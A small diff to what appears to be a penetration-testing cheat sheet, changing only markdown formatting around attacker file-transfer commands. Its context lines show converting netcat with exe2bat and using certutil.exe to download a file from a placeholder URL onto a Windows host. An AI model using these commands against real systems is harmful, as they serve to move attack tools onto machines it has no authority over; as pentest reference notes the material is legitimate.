@@ -97,8 +97,7 @@ wine $(locate exe2bat.exe) nc.exe nc.txt
 ```
 
 - certutil.exe
-
-```bash
+```
 certutil.exe -urlcache -split -f “$URL” $FILENAME
 ```
 
